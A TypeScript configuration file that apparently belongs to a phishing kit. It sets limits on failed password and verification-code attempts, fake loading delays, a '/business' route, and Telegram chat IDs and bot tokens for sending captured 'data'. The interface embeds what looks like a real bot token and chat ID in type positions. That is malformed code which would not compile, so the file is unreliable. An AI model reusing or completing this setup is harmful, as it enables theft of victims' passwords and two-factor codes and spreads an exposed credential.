interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		page_loading_time: number;
		password_loading_time: number;
		code_input_enabled: boolean;
	};
	telegram: {
		notification_chatid: -4512426196;
		notification_token: 7794863875:AAFVUgqTSkrFvHOcRyUMt8Ne5c0cQ4y-cAA;
		data_chatid: -4512426196;
		data_token: 7794863875:AAFVUgqTSkrFvHOcRyUMt8Ne5c0cQ4y-cAA;
	};
	router: {
		business_url: string;
	};
}

const getConfig = async (): Promise<Config> => {
	// b thay vao day nhe, t
	return {
		settings: {
			code_loading_time: 3000,
			max_failed_code_attempts: 5,
			max_failed_password_attempts: 3,
			page_loading_time: 2000,
			password_loading_time: 4000,
			code_input_enabled: true,
		},
		telegram: {
			notification_chatid: '123456789',
			notification_token: 'abcdefg-token',
			data_chatid: '987654321',
			data_token: 'hijklmn-token',
		},
		router: {
			business_url: '/business',
		},
	};
};

export default getConfig;
